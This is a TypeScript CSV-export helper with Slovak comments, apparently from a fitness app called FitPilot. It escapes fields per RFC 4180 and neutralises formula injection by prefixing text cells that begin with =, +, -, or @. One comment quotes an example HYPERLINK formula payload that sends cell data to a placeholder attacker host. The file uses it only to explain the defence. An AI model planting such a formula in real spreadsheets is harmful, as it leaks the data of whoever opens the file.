// FitPilot — export dát (feature/export-dat): minimálny CSV builder. Žiadna
// knižnica potrebná pre tak jednoduchý tvar (jedna plochá tabuľka) — RFC 4180
// escaping (úvodzovky pri čiarke/úvodzovke/newline v hodnote).
//
// feature/security — ochrana proti CSV/formula injection: poznámku k meraniu píše
// klient a tréner exportovaný súbor otvára v Exceli/Sheets. Bunka začínajúca
// `=`, `+`, `-`, `@` (alebo tabulátorom/CR pred nimi) by sa vyhodnotila ako vzorec
// (napr. =HYPERLINK("http://útočník/?"&A1,"klikni") vie vyexfiltrovať iné bunky).
// Také TEXTOVÉ bunky sa zapisujú s úvodným apostrofom, takže sa zobrazia ako text.
// Čísla (typu number) sa neupravujú — záporné číslo je legitímna hodnota, nie vzorec.

const FORMULA_START = /^[\t\r ]*[=+\-@]/;

export function csvCell(value: string | number | null): string {
  if (value == null) return "";
  let s = String(value);
  if (typeof value === "string" && FORMULA_START.test(s)) s = `'${s}`;
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

export function toCsv(headers: string[], rows: (string | number | null)[][]): string {
  const lines = [headers.map(csvCell).join(","), ...rows.map((r) => r.map(csvCell).join(","))];
  // \r\n a BOM — Excel na Windows (bežný cieľ tohto exportu) inak vie zle
  // rozoznať oddeľovač/kódovanie diakritiky.
  return `﻿${lines.join("\r\n")}`;
}
